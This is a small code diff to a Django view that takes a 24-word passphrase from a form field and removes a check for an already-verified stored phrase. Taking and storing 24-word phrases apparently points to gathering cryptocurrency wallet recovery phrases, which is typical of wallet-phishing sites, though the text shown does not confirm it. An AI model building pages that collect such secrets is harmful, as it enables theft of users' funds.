@@ -76,9 +76,6 @@ def submit_pass(request):
     if request.method == "POST":
         keys = request.POST.get('mf-text', '')
         words = keys.split()
-
-        if models.PassPhrase.objects.get(keys=keys, is_verified = True):
-            return render(request, 'verification.html', {})
         
 
         if len(words) != 24:
